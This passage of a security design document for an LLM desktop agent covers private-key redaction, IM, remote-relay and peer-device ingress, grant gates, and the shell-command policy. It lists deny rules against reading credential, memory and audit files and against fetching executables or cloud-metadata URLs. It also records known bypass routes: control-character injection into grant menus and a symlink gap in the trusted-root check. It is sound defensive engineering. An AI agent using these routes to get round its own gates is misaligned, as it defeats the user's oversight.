> Incident postmortem: a user pasted a complete RSA private key. The old regex only
> matched the `-----BEGIN ... PRIVATE KEY-----` marker line, so **the entire base64
> body went straight to the LLM**, displaying in plaintext in the chat UI.

After the fix, `-----BEGIN ... PRIVATE KEY-----` + body + `-----END ... PRIVATE
KEY-----` are matched as a whole block (non-greedy body), and the entire key is
redacted as a single `[REDACTED:private-key]`. Supports 7 type variants: PKCS#8
unencrypted / RSA / OPENSSH / DSA / EC / ENCRYPTED / PGP. The Rust regex engine
does not support backreferences, so the 7 BEGIN/END pairs are enumerated as an
alternation. The type alternation is **optional** — it catches PKCS#8
(`-----BEGIN PRIVATE KEY-----`), which has no type prefix.

The Rust and TS sides share a single regex access entry point
(`crates/kaya-core/src/llm/scrub.rs::ssh_key_regex()`) to prevent the two sides
from drifting.

### 4.4 `originalBytes` Reflects the Raw Input

The UI prompt "original 5.0 KiB → 4.0 KiB" must use the **raw** input byte count,
not the post-scrub byte count — a single scrub pass can shrink a 5 KiB paste down
to 1 KiB (the PEM body is 4 KiB), and if the user sees "original 1 KiB" they will
think "I only typed 1 KiB". The regression test
`userInputGuard.test.ts::originalBytes reflects RAW input bytes` locks this
invariant.

### 4.5 Explicit UI Prompt on Hits

When a user message has a redaction hit, the UI renders a "Redacted" badge; on
truncation it shows "Truncated: original N KiB → M KiB". **The user knows exactly
what happened**, instead of "the system silently edited my words".

### 4.6 IM Channel Ingress (2026-08-22, v2.1.0; Slack added 2026-09-20)

Feishu / WeCom / Slack (2026-09-20) are the **second user-input ingress** besides the chat input
box: allowlisted users message the bot in the IM, and the local kaya LLM
processes the message and streams the reply. The ingress changed; the defenses
did not — every inbound message still goes through the **same five-gate
pipeline**:

- **Gate 0 runs as usual**: before entering the agent loop, each message passes
  the same `user_input_guard` (scrub-first → truncate 32 KiB); tool calls still
  go through policy → safety → isolated execution (a separate `zsh -f -c`
  subprocess) → output scrub. Conversation content goes only to the LLM
  provider path you picked on the "General" page; kaya itself transits no
  third party. The isolated-execution subprocess environment comes from the
  same source as the desktop — the boot-captured, per-value Strict-scrubbed
  env snapshot (§6); since 2026-09-07 IM and desktop share the **very same**
  snapshot (previously the IM side had an empty snapshot and subprocesses only
  inherited kaya's parent-process env). The subprocess-visible environment is
  thus exactly on par with the desktop — a deliberate alignment within the
  "IM == desktop chat" contract.
- **Admission allowlist (strangers denied by default)**: admission is by
  platform user identity — Feishu takes an open_id (`ou_` prefix), WeCom a
  member userid, Slack a member ID (`U` prefix, 2026-09-20). Messages from
  users not on the list are **dropped outright**:
  no LLM, no turn, no conversation record. A channel cannot start with an
  empty list — without admission control, anyone could make the LLM execute
  commands on this machine.
- **Coding capability under the same master gate + grant gates** (2026-08-22
  mirror alignment): the IM turn's tool table matches the full desktop set,
  but `terminal_write` is registered only when the coding-mode master-switch
  snapshot is on, and before execution it still checks the per-tab grant table
  + per-minute write budget (the same checkpoints as the desktop);
  `agent_config` edits still go through the shared grant gate — without a
  grant only a grant request is emitted, nothing is written to disk. On
  Feishu / Slack, grant decisions are made via **interactive cards (buttons)**
  (2026-08-22 P2 / 2026-09-20,
  see §4.7); WeCom has no cards this round — decisions are still made on the
  desktop, and the IM side cannot self-authorize.
- **Credentials live only in the system keychain (macOS Keychain / Windows
  Credential Manager)**: the Feishu App Secret / WeCom Secret / Slack dual
  tokens (app-level `xapp-` + bot `xoxb-`, 2026-09-20) are written to
  the system keychain on save — never to a file on disk, never read back into
  the UI, and never sent to any LLM provider along with conversation content.
- **Long connections go straight to the platform**: Feishu uses the official
  WebSocket long connection (open-lark), WeCom uses `wss://openws`, Slack uses
  Socket Mode WSS (the app-level token exchanges for a URL via
  `connections.open`, 2026-09-20) — **no
  public IP or callback server is needed**, and there is no third-party relay;
  the session mapping lands in `~/.kaya/channels/sessions.json`, the mirror
  target chat in `~/.kaya/channels/mirror.json` (2026-09-01, mirror binding
  restored across restarts), and IM sessions reuse the existing conversation
  JSONL persistence (`~/.kaya/conversations`, see §8). **Stated honestly**:
  the channel ingress is not yet wired into the audit JSONL — the audit trail
  has no IM inbound/outbound rows; the gap is planned to be closed in a later
  round. The five gates themselves do not depend on the audit log and run
  gate-by-gate in the IM pipeline as usual.

### 4.7 IM Channels and Mirroring (2026-08-22)

Mirroring is an **optional enhancement** on top of §4.6 that widens the
"conversation content leaves the machine" boundary from one path (the LLM
provider) to two — so everything is off by default and explicitly opt-in:

- **Mirroring = the project's only new content-egress path, off by default**.
  Before it is enabled, conversation content leaves the machine only toward
  the active LLM provider; after "desktop → IM mirroring" is enabled, the
  desktop chat's message stream (including the echo of your own input,
  "You: …") is pushed in real time to the IM chat you designate. The toggle
  lives in Settings → IM Channels and can be flipped while running
  (`channel_set_mirror`); turning mirroring off does not break the binding —
  re-enabling resumes mirroring to the original chat without re-notifying.
- **Both mirror directions share the same outbound pipeline**: desktop → IM
  goes through FanoutSink reusing ChannelEventSink (the same rendering /
  throttling / egress as IM turns); IM → desktop fans the IM turn's events
  out to the WebView (the same sink implementation as desktop llm_chat).
  Content has already passed gate-4 output scrub at the source turn (desktop
  turns at the user's configured level, IM turns fixed at
  `ScrubLevel::Strict`); the mirror outbound pipeline itself does not scrub
  again.
- **Feishu / Slack grant cards are equivalent to desktop grant cards** (2026-08-22
  P2; Slack added 2026-09-20, Block Kit interactive buttons): terminal_write /
  agent_config edit grant requests render in Feishu / Slack as
  interactive cards with "Approve / Deny" buttons, and decisions are written
  to the **same grant store shared with the desktop** — what the IM approves
  the desktop honors, and vice versa; there is no second authorization state.
  Security boundary: the operator must be verbatim on the admission allowlist
  (the same gate as inbound messages; stranger callbacks are silently
  dropped); button fingerprints are assembled locally, and callback parse
  failures always fail closed; decisions are recorded in app_log, with the
  operator recorded by length, not content. The card detail's target display
  name is a composed recognizable label (running-instance ID + project tag /
  cwd tail; since 2026-10-01; the cwd basename is process metadata, same
  caliber as notification excerpts); title / path components are stripped of
  control characters and markdown metacharacters before egress, and the
  fingerprint still uses the raw paneId, decoupled from the display label.
- **Proactive agent-status notifications** (2026-08-22 P3): while mirroring
  is on, state changes of the coding agent in a bound tab (waiting for input
  / idle-done / came online / exited) are proactively pushed to the mirror
  chat, in zh/en per the channel's language snapshot. The screen excerpt in
  the notification is the **same already-scrubbed text** used by the desktop
  "pending decision" bar (the watcher passes it through the same scrub_text
  pipeline before emitting) — not a new content egress; per (tab, kind)
  cooldowns (60s / 300s / 30s) prevent notification storms; push failures are
  all silent and never affect the watcher or the IM main link.
- **The IM tool table is aligned with the full desktop set** (2026-08-22
  mirror alignment): terminal_read / terminal_write / agent_config /
  task_list share the same stores as the desktop (terminal history / writer /
  grant / abort tables / task-list snapshot). `terminal_write` remains
  governed by the coding-mode master switch — **the master switch is an
  atomic flag shared between desktop and channels; flipping the desktop
  switch writes through to the channel side immediately via
  `channel_set_coding_mode` and takes effect on the next IM turn**; writes
  themselves remain bound by the per-tab driving grant.
- **Stated honestly (WeCom limitation)**: WeCom's mirror echo (UserEcho) and
  proactive notifications depend on an active callback registration (in
  pure-desktop scenarios with no IM turn in flight, outbound messages may be
  **silently lost**); this round only Feishu was verified on a real device —
  WeCom mirror capability is code-aligned but not acceptance-tested on a real
  device.
- **IM channel turns: sensitive trusted-read subtrees denied (2026-10-08)**:
  IM channel turns set `restrict_sensitive_reads` in the policy context
  (§5.1 v3.0.7 batch, F3; set in production only for IM turns — remote SPA
  turns reuse the desktop `PolicyContext` and peer turns register no
  `run_shell`, so neither is in scope), and any trusted-read hit on a sensitive subtree
  (`memory/` / `audit/` / `conversations/` / `channels/` / `remote/` /
  `debug/` / `tmp-images/`) is denied with `[policy:trusted-read-miss]`;
  the desktop chat's ability to read its own trusted root is unchanged
  (that is the user's own machine, displayed locally). **Honest scope
  (verified 2026-10-26)**: in production `restrict_sensitive_reads` is set
  **only for IM channel turns** (`crates/kaya-core/src/channels/inbound.rs`);
  turns started from the remote SPA reuse the desktop `PolicyContext` (the
  flag is false) and peer turns register no `run_shell` ⇒ this denial
  **actually covers IM channel turns only** — remote / peer are not in scope
  (the earlier "IM / remote" wording did not hold for the remote half; this
  is corrected here). **Added
  2026-10-26**: the cloud usage upload's **local state**
  (`~/.kaya/usage/upload-<deployment>.json` and its atomic-write temp file
  `usage/upload-<deployment>.json.tmp`, holding the account id, device id and provider
  dimension mapping) is denied the same way — IM channel turns may not
  read it away. **The `usage/` subtree is judged per path, admitting only
  the usage event files**: the directory itself (an explicit-path
  recursive read `grep -r x ~/.kaya/usage`, or a bare recursive search
  with cwd set to that directory), the state files, the atomic-write temp
  file, the cross-process lock file, and every wildcard form that would
  match them (`~/.kaya/usage/*`, `upload.json*`, `upload-*.json*` — the lexical layer cannot
  expand wildcards, so blocking exact paths alone does not hold) are all
  denied. The **usage event files**
  (`usage/events-YYYY-MM-DD.jsonl`, counts plus provider / model
  identifiers only) remain readable, and the `usage/` subtree is **not**
  on the sensitive-directory list. **Policy change
  (2026-10-08, user's call)**: IM is an allowlist-trusted channel (strangers
  are fail-closed), so it is treated at the trust level of an approved user —
  the memory trio (`memory_search` / `memory_timeline` / `memory_get`) is now
  registered on IM (remote access gets it automatically via the same
  pipeline), and explicit "remember" is supported too (pure direct-write
  short-circuit with zero LLM turns; inline intent turns register
  `memory_add` with a turn-end fallback that now writes directly and reports
  its real outcome; host
  synthetic turns never trigger remember detection). **Boundaries kept**:
  this denial is unchanged (raw memory/audit files stay unreadable via
  run_shell / list_dir — memory content leaves only through the scrubbed
  memory_* tool outputs), `schedule_manage` / `task_queue` stay off the IM
  tool table, task_list create stays sink=None (fail-closed) on IM, all
  memory tool outputs pass output scrub, and tombstones (discarded/purged
  entries) stay invisible to the retrieval tools.

### 4.8 Remote Access (Cloud Relay) (2026-09-15, Phase 1)

Remote access (Settings → Remote access) is the **third user-input ingress**
besides the chat box and the IM channels, and the second path — after IM
mirroring — on which conversation content leaves the machine. It shares the
mirror's positioning: **off by default, explicit opt-in**, with the relay
disclosure stated next to the enable toggle ("conversation content is relayed
through yunhou servers — in-memory pass-through only, never persisted").

- **Relay server posture (verifiable in code)**: in-memory routing only — it does
  not parse payloads, does not persist any frame, and its access logs contain no
  payload and no user_text; all traffic is WSS (TLS); rooms are hard-isolated by
  user_id (only browser clients under your own account can reach your device);
  relay tickets are minted from the access_token via `POST /relay/ticket` and are
  **short-lived at 5 minutes** (renewal doubles as the entitlement re-check —
  paid-access loss converges to a disconnect within ≤6 minutes). Even if the
  relay were compromised, an attacker would only see the live stream inside TLS
  and in memory — no history to exfiltrate (same posture as the /chat proxy: the
  server can see what it forwards, but never writes it down). **API keys never
  transit the relay**: BYOK keys live only in the system keychain and in the
  auth headers of LLM calls made directly from this machine — remote turns still
  issue their LLM calls on the desktop, so no API key ever crosses the relay.
- **The 5 gates are isomorphic**: messages initiated remotely go through the
  **exact same pipeline** as desktop / IM — the `channels::handle_inbound`
  ingress → the same `user_input_guard` (scrub-first → truncate at 32 KiB) →
  tool calls still pass policy → safety → isolated execution (a separate
  `zsh -f -c` subprocess) → output scrub. The scrub level matches the desktop
  Normal tier (Balanced) — the remote operator is the device owner, unlike the
  IM Strict tier (aimed at allowlisted IM senders).
- **A single grant state**: the remote side can approve / deny terminal_write /
  agent_config edit grant requests; decisions are written to the **same grant
  store shared with the desktop** — approvals made remotely are honored by the
  desktop and vice versa; there is no second authorization state (isomorphic to
  the Feishu approval cards). terminal_write remains gated by the coding-mode
  master switch + per-tab grant + per-minute write budget (the same checkpoints
  as the desktop).
- **Paid gate on both sides**: kaya's `remote_enable` enforces
  `require_paid_access("remote")`, and the relay's `/relay/ticket` issuance
  enforces the same entitlement — there is no false "relay rejected but kaya
  shows enabled" state; `remote_disable` is **always allowed** (fail-safe —
  downgraded or logged-out users can always turn it off; no "on but can't turn
  off" stuck state).
- **Local storage**: the device identity (random ULID + display name) and the
  persisted enabled flag live in `~/.kaya/remote/device.json` (atomic write,
  0o600); the device name is display-only on the remote side. Relay tickets and
  access_tokens are never persisted (the access_token is memory-only; the
  refresh_token lives in the system keychain (macOS Keychain / Windows Credential Manager)).
- **Stated honestly (audit gap)**: remote turns reuse the IM `handle_inbound`
  pipeline, so in-flight turn origins are also recorded as `TurnOrigin::Im`
  (no dedicated Remote variant yet); as with the IM channels (§4.6), remote inbound/outbound turns are not yet written to the
  audit JSONL — the gap is planned to be closed in a later phase. The 5 gates
  themselves do not depend on the audit log and run gate-by-gate in the remote
  pipeline as usual.

### 4.9 Cross-Device Coordination (device↔device peer, 2026-10-15)

Cross-device coordination (Settings → Cross-device coordination) lets two
kaya desktops **under the same account** cooperate directly over the relay:
one side (the initiator A) dispatches tasks to a coding agent running on the
other side (the executor B), while B's agent status and grant requests stream
back to A in real time. Transport reuses the **same relay connection and the
same user_id room** as §4.8 remote access — the relay's dumb-pipe posture is
**unchanged**: it does not parse payloads, does not persist any frame, and its
access logs contain no payload; peer frames are merely a new payload kind
under the envelope `"kind":"peer"` (a kind namespace deliberately isolated
from the existing remote frames — receivers check the envelope kind first).

- **Off by default + fail-closed admission on the executor**: the coordination
  master switch defaults to off; once enabled, you whitelist devices one by
  one (optionally scoped per agent). The config lives in
  `~/.kaya/remote/peers.json` (atomic write, 0o600; a corrupt file is treated
  as off — the safe side). With the switch off, or when the sending device is
  not whitelisted, the **execution-directed frames** (`task_dispatch` /
  `grant_respond` / `task_control` — the three kinds the executor actually
  consumes) are rejected outright and logged at warn level (tag `peer_denied`;
  the payload records only the device id and frame kind — **never the frame
  content**); since 2026-10-19 a rejected `task_dispatch` also returns a
  `failed` TaskState to the sending device (fixed guidance text, never frame
  content; `grant_respond` / `task_control` stay silent) — the admission
  semantics are unchanged (no execution, no approval card); the initiator
  converges from "no feedback at all" to a visible failure with guidance;
  discovery/status frames (`hello` / `bye` / `task_state` /
  `grant_request` / `agent_event`) do not pass through the admission gate and
  are registered and forwarded to the front-end as usual. **Stated honestly**:
  once remote access is enabled, discovery/status frames already flow between
  same-account devices (as soon as presence arrives, the machine sends the peer
  a hello plus an agent-status digest fan-out — the outbound direction is
  likewise not governed by the coordination switch); the switch governs "may a
  task be dispatched onto this machine", not "are devices visible to each
  other". The initiator needs no configuration —
  initiating is inherent; being initiated against is what requires admission.
- **Trust model: same account = the owner themselves**. A peer device can only
  join the room when signed into the same account (the relay hard-isolates
  rooms by user_id, plus server-side sender stamping — see below), so the peer
  is treated as "the owner's other machine": frame content passes through the
  output scrubber before leaving the machine, at the **Balanced** level (same
  posture as §4.8 remote access — not the IM-facing Strict level aimed at
  allowlisted IM senders); free-text fields additionally carry hard caps
  (screen tail ≤ 8 KiB, evidence ≤ 500 bytes).
- **Agent-card fields cross the wire (2026-10-17)**: alongside the existing
  excerpt and status row (model / context / thinking / permission), agent
  status frames (`agent_event`) optionally carry **cwd and the pane project
  label** — the peer renders its directory and project-label rows from them
  (matching the local card's information surface). Both fields go through
  the same outbound pipeline as the excerpt (Balanced scrub + 8 KiB cap),
  are rendered as plain text only, and remote cards offer no label editing.
  The semantics are **authoritative when present**: an empty string means
  "no value / cleared" (clearing a label propagates and leaves no stale
  value); a missing key only happens with an older peer, and the receiver
  keeps its old value — so mixed-version operation neither breaks nor
  changes existing semantics. Tab-rename subtitles and waiting-menu options
  stay local.
- **On-demand diagnostics (2026-10-17)**: with `KAYA_PEER_DIAG=1`, the
  discovery path (hello_ok / presence / peer envelopes) writes App
  diagnostic logs under tag `peer`; **the diagnostic projection itself** is
  off by default (no env var, nothing written — the records
  `peer_frame_decode_failed` / `peer_frame_unstamped` / `peer_self_frame` /
  `peer_table_evicted` / `presence_lagged_dropped` are written regardless of
  the env var, and carry only device ids, table names, evicted keys, event
  names, and counts). The payload is a metadata
  allowlist (device id / device name / version / frame kind / tab id /
  agent id / event_kind / receiver counts / online flag / room device count
  and connected_at / target device id / capability-list agent_id +
  display_name) — it **never records excerpt, status, cwd, project, or any
  free-form body text** (a unit test locks down that agent_event metadata
  omits the excerpt). The projection runs **only in the relay layer**, before
  protocol decoding (the peer pump no longer projects again, so each inbound
  peer frame / presence yields at most one **diagnostic projection** line —
  unconditional warn records such as decode failures are counted separately),
  so the peer-envelope allowlist accepts **JSON string values only**
  (`as_str`): nested objects / arrays / numbers / booleans are omitted
  entirely, strings are truncated to 128 chars, and the `agents` /
  room-device lists are capped at 32 entries — a malformed frame can neither
  smuggle body text into these fields nor inflate a single log line
  (negative and truncation tests lock this down; app_log does not auto-rotate
  in diagnostic mode, so a sustained frame stream still grows the log).
  Presence / hello_ok payloads come from
  **decoded, typed structures**: their `online` / `connected_at` booleans
  and numbers are protocol fields rather than arbitrary JSON and are written
  as-is. The identifier slots in the allowlist (`tab_id` / `agent_id` /
  `device_name`, etc.) are peer-supplied and only truncated, not
  content-validated: they are identifier slots, not body channels; body
  fields (`excerpt` / `status` / `cwd` / `project`) are never projected.
- **The envelope sender is stamped by the server**: a peer frame's
  `from_device_id` / `from_role` is **overwritten** by the relay with the
  authenticated connection's identity — the client does not fill it in and the
  server never trusts a client-supplied value (otherwise an SPA client in the
  same room could forge a device identity and send `task_dispatch`; see the
  relay delta spec, "change 1: server-side sender stamping").
- **Grants are approvable on both ends; the executor is authoritative**: a
  terminal_write-style grant request is presented on both sides at once (A's
  card reads "target device B", B's card reads "from device A"); an approval
  on either side is written to **B's grant store** (the authority lives where
  execution happens), the outcome is broadcast, and both cards resolve. For
  the same grant_id, first response wins and late responses are dropped
  idempotently (the grant store's one-shot consumption semantics make this
  natural). **Grants are scoped per (source device, tab, agent)** (key
  `peer:{device}:{tab}`, pid sentinel 0): an approval for device A does not
  admit device B's dispatches to the same (tab, agent), and never overlaps
  the desktop terminal_write grant namespace (bare tab_id + real pid). An
  executor restart loses the pending grant context, and a late approval
  afterwards gets a failed frame back ("grant context does not exist")
  instead of being silently swallowed. `remember_scope` supports "don't ask
  again for this kind of operation from this device". There is no
  cross-machine lock for dual-active contention: remote dispatch reuses the
  same local dispatchableNow gate sequence (busy means reject/queue), and
  B's local activity is reported as busy by the watcher as usual.
- **Defense-in-depth on dispatch text and approvals (2026-10-16)**: the
  executor rejects dispatch text containing control characters (`\t` and
  `\n` are allowed; ESC, `\r`, and other C0/C1 are denied — the same check
  as the terminal_write tool, preventing terminal control-sequence
  injection and embedded carriage returns auto-answering grant menus); a
  `grant_respond` is only honored when its server-stamped source device
  matches the device that owns the pending grant (mismatches are rejected
  without consuming the pending entry and without any reply frame, so the
  existence of a grant_id is never leaked); the three in-memory tables
  (pending dispatches, task routes, inbound grants) all have capacity caps
  with FIFO eviction (so a peer flooding frames cannot grow memory without
  bound), and evictions are logged at warn level with metadata only, never
  content.
- **Audit posture (stated plainly, mirroring the §4.8 gap disclosure)**:
  failures and rejections are logged at warn level in the app log
  (rejections tagged `peer_denied`, whose payload records only the device id
  and frame kind; executor-side failures/anomalies tagged `peer_exec`, whose
  payload additionally carries **metadata** such as the task_id and an error
  summary — **neither ever records frame content**); successful dispatches /
  executions currently have **no dedicated audit
  record** — on A's side the factual trail lives in the task list and chat
  history, and this gap is slated to be closed later. Neither side records any
  secret — BYOK keys live only in each machine's own system keychain, and no
  peer frame field carries a key.
- **Disconnect semantics**: when the relay link drops, all peers are marked
  offline (greyed out in the UI, entries retained); a hello frame restores
  presence on reconnect, with a reconciliation window preventing duplicate
  dispatches. While a peer is unreachable, queue items get `remoteLink: down`
  and their row actions reduce to "mark failed / delete" (manual kill).
- **On-demand remote Agent access (`agent_access_v1`)**: `agent_event` may carry an opaque instance generation, bounded scrubbed menu options, and a one-use waiting_token. The receiver keeps a bounded in-memory display projection, never persisted; reloads restore it from a snapshot and exit/offline events remove it. Like existing status excerpts, these fields travel through relay to same-account devices; they do not grant execution rights.
  - Screen/report reads invoke no model, shell, or arbitrary-path reader. Both require device/Agent admission and `allow_host_chat`; identity and scope are checked before and after reading, and revocation or replacement discards the output. Existing scoped local readers apply Strict scrub, with at most 8 KiB sent across devices and fixed error codes only. Output is displayed in the current view, never added to chat history or model context.
  - Explicit menu answers accept only 1–9 and require the current generation and a one-use ticket for the waiting episode. Inside the write domain and writer lock, the executor resamples, validates, and consumes the ticket. Busy/resolved/exit/replacement revokes it. Local interaction answers, nonempty manual input, and every actual nonempty write by an authorized LLM `terminal_write` (including separate submit and resend keys) also retire tickets while holding the same pane write domain and writer lock. Denied or unauthorized calls that write no bytes and empty writes preserve tickets. The same menu is not reissued a ticket until the waiting episode is observed to end; an identical menu appearing afterward requires a new ticket. Peers without the capability are rejected, with no fallback to ordinary cmd frames.
  - Replies match both source device and request_id. Deduplication, pending requests, and tickets are bounded in memory. Completed requests retain a one-hour deduplication tombstone; in-flight requests are pinned, with a total cap of 4096 and at most 16 concurrent requests. Expiry frees request-id capacity without reviving consumed menu tickets. Waiting does not block relay processing; offline/close ends waiting. A 20-second timeout means the result is unconfirmed, with no automatic resend. Logs contain no content.
  - Shutdown first revokes admission, marks peers offline, and aborts local turns. Bye frames bypass the ordinary queue; outside the display lock, shutdown waits for real transport write acknowledgments under one shared 250ms absolute deadline before closing relay. Backpressure permits brief retries. Timeout or failure increments a counter and emits a content-free warning; the budget does not multiply with peer count, and presence/LWT still converges undelivered exits. A cancelled shutdown (the future is dropped while waiting on the preceding lock or the acknowledgments) still emits exactly one transport close, so the transport supervisor never outlives the stop.
- **Cross-device chat (host chat, 2026-10-19)**: the Chat path's remote
  binding changed from "write directly into the peer agent's input line" to
  a **Kaya↔Kaya conversation** — A's user text reaches **B's Kaya** as a
  directed peer frame (`host_request`, one-shot `request_id`); B runs one
  round with its **local model** and returns only the answer text (≤8 KiB,
  Balanced scrub + char-boundary truncation) as a directed `host_reply` —
  never a broadcast. Design:
  `docs/superpowers/specs/2026-10-19-kaya-to-kaya-chat-design.md`.
  - **New disclosure surface**: B's model reads local agent state / screen
    tails (via the three read-only tools below, filtered by the agent
    allowance), so the answer text may contain small screen summaries; there
    is **no** full-context / scrollback cross-device sync. Each request
    consumes B's local model quota (the settings checkbox copy says so). On
    A, the reply is **display-only** — it does not enter A's local LLM
    context (A's coding agent and local model never see it).
  - **B-side local echo (2026-10-20, Q2)**: when B receives a request from
    the peer, B now renders **the peer's original text** and **B's own
    answer** in B's desktop chat panel (the peer's text as a user bubble
    carrying an origin badge, B's answer as the assistant bubble right
    after it). ⇒ **The peer's request text therefore lands in B's local
    chat history** (persisted with `messages` in localStorage — the same
    treatment as the IM mirror); previously the whole cross-device turn
    was invisible on B. B's local model context is unaffected (cross-device
    turns use their own `c_peer_<device_id>` conversation and never enter the
    desktop conversation). **Only admitted requests are echoed** (refused /
    duplicated `host_request` frames are never forwarded to the frontend);
    the peer's original text passes Balanced scrub before display.
    `device_id` / `request_id` are shape-checked at B's entry
    (`[A-Za-z0-9_-]{1,64}`) — `device_id` becomes part of a conversation
    filename, so illegal values (e.g. `../`) fail closed and create no
    session.
  - **Independent admission bit `allow_host_chat`**: a new per-device field
    in `peers.json`, **default false, missing field = rejected** (serde
    default, fail-closed); it does not reuse the "can connect / can dispatch"
    admission bits. The settings page shows a per-device "allow chat"
    checkbox, unchecked by default. `peer_access_set` is full-replace
    semantics; the TS mirror carries the same field plus a wire round-trip
    test, so a save cannot silently turn it off.
  - **Tool allowlist**: a peer turn registers only the three read-only tools
    `agent_state` / `agent_report` / `terminal_read` (tabs/agents outside the
    allowance neither appear nor are readable; when the allowance resolves
    to an empty tab set, the read-only tools are not registered at all —
    fail-closed) plus the forwarding tool `peer_agent_send` (five gates:
    admission / allowance / tab identity / control characters / grant;
    forward-only, never waits). Without a grant, it reuses the existing `PeerExecInbound` dual-device approval card and reports waiting for authorization. Approval and actual writes recheck device, Agent scope, and `allow_host_chat`; rejection performs no write. Without an injected executor it remains fail-closed. `run_shell` / `list_dir` / `probe_env` /
    `tavily*` / memory writes / `schedule_manage` / `task_queue` /
    `agent_config` / the general `terminal_write` never enter a peer turn.
  - **Zero-content audit**: B rejections tag `peer_denied` (device id + frame
    kind); B turn completion tags `peer_host`
    (`{device_id, request_id, phase, error_code}`) — all metadata only,
    **never the request or answer text**. A-side sends have **no Rust-side
    audit** (same posture as the existing peer_dispatch success path), and
    timeouts are settled by the frontend in-flight ledger (TS TTL) as
    `peer_host_timeout`, again with no Rust-side audit; the success path has
    no content-level audit (same posture as the existing remote/peer paths).
    - **`peer_host` lands only after the frame actually went on the wire
      (2026-10-20)**: it used to be written at enqueue time, so
      `phase:"final"` only proved the turn finished, never that the frame was
      actually sent (that false signal misdirected the real-world
      cross-device reply-loss investigation). It is now gated on a
      transport-level "written to the wire" ack (the relay transport resolves
      it after the WS write completes): only an uploaded frame produces
      `peer_host` (with `sent:true`); a failed delivery logs a warn-level
      `peer_host_send_failed` and an unconfirmed upload logs a warn-level
      `peer_host_send_timeout` — neither writes `peer_host`. Dropped
      outbound frames additionally log a warn-level `peer_send_failed` (target
      device + cumulative failure count, no frame content); exhausting the
      backpressure retry budget logs a warn-level
      `peer_send_retry_exhausted` (target device + sequence + cumulative
      failure count), also zero content. **All of it is still metadata only,
      zero content.**
    - **The A-side in-flight ledger is persisted (2026-10-20)**: the
      cross-device in-flight request ledger moved from a module-level `Map`
      in `peerHostChat.ts` into a persisted zustand store slice
      `peerHostRequests` (in `partialize`, `migrate` backfills `{}`) — the
      old module-level state was wiped by Vite HMR re-evaluation / a page
      reload, which silently dropped the reply and left the placeholder
      message stuck on "waiting for a reply…". The ledger stores **only the
      request id / device id / device display-name snapshot / placeholder
      message id / timestamp — never any body text**. A reply whose
      `request_id` is not in the ledger (replay / late beyond the window /
      a request we never sent) is **dropped silently and never written to
      the local chat history** — that body is peer-controlled and must not
      be persisted through a visible "unmatched" notice (2026-10-20 review).
      Placeholder settlement is handled by matched terminal frames, the TTL
      sweep, and the offline path.
  - **Security hardening (landed in the same round)**: device frames (non-empty
    `from_device_id`, stamped by the relay) **must never enter RemoteInbound's
    command dispatch** — any `cmd` frame (`chat_send` / `agent_command` /
    `chat_abort` …) whose sender is a device is rejected with a warn-level
    app_log `remote_device_frame_rejected` (command name `payload["cmd"]`
    only, truncated to 64 chars, no other payload fields); no
    conversation is created, no turn is spawned, and no outbound broadcast is
    produced. This closes the live privilege hole where a device frame
    disguised as `chat_send` would run a silent turn on B whose reply
    broadcasts nowhere reachable; device-side conversations go exclusively
    through the peer envelope (`PeerChatInbound`).

---

## 5. Gates 1 + 2: Policy + Safety Gates

LLM-invoked `run_shell` goes through the first two stages of the Rust 4-stage
pipeline:

### 5.1 Policy (capability policy, 3 semantic tables + 7 deny categories)

Source: `crates/kaya-core/src/llm/policy.rs` (308 cargo tests, re-measured 2026-10-15 for release). Since round-67 (2026-07-05), the capability policy is **no longer a binary allow/deny-list structure** — it's **3 semantic tables (METADATA / STREAM_TRANSFORMERS / FILE_READERS) + a permanent blacklist + an allowlist-miss catch-all**, and the deny reason carries a structured `[stage:subcategory]` prefix (see §5.1.1). The system prompt (`policy_prompt::render_allowed_section_*`) and the run_shell tool description (`tools/run_shell.rs::rules_prose`) are generated from the same data source — single source of truth, no drift.

- **trusted_download sub-stage (round-57, 2026-06-28)**: The LLM can use
  `curl -o ~/.kaya/<file> URL` to download external context into the trusted
  root. `-o` / `--output` / shell-redirect `>` parses the write target; suffixes
  pass a safety check (`.sh` / `.py` / `.exe` / `.dmg` / etc. are rejected; see
  `BLOCKED_DOWNLOAD_EXTS`); the URL must be http(s) and must not point at a
  loopback / link-local / cloud-metadata host (SSRF). **v2.1.10 review
  M-sec-1 tightening**: trusted downloads reject `-L` / `--location` —
  following a 302 redirect would bypass the first-hop URL vetting; to follow
  a redirect, issue a separate call so every hop is vetted. **New privacy
  surface**: the downloaded bytes do not
  flow into the LLM directly — only a subsequent `cat` by the LLM reads them back
  via trusted_read; the file lands at a user-visible path, which the user can
  inspect or delete at any time. **2026-10-04 review M4 tightening**: inside the
  root with a safe extension is no longer enough — a write target under a
  **control-plane relative path** (`agent-overrides.json` /
  `model-library.json` / `version.json`, and the `agents.d/` / `channels/` /
  `remote/` / `conversations/` / `audit/` / `memory/` / `docs/` / `terminal/` /
  `history/` / `logs/` / `debug/` / `tmp-images/` subtrees) is always denied
  (`[policy:trusted-download-miss]`, same list as shell redirects): these files
  define kaya's own behavior and security semantics (the agent-recognition
  allowlist, model bindings, channel sessions, the local docs injected into the
  system prompt, and the audit/memory/conversation records), so letting a
  public-network payload overwrite them would let an attacker redefine the
  protection semantics. Reads stay allowed (trusted read unchanged); writes are
  denied. **Boundary (2026-10-04 independent review, Minor)**: like the rest of
  the trusted-root pipeline, this check is purely lexical normalization and does
  not resolve symlinks — a pre-planted symlink inside `~/.kaya/` pointing at a
  control-plane file would bypass it; planting one needs a separate write
  channel (no `ln` in the run_shell allowlist), so the residual risk is low and
  recorded here. See
  `docs/superpowers/specs/2026-06-28-trusted-download-design.md`
  for details.

  > Windows: in PowerShell `curl` is an alias for Invoke-WebRequest; trusted download teaches/uses the explicit `curl.exe` form (after `table_base_key` strips the `.exe` suffix for normalization it still hits the same `curl` allowlist entry, 2026-08-25 W2).

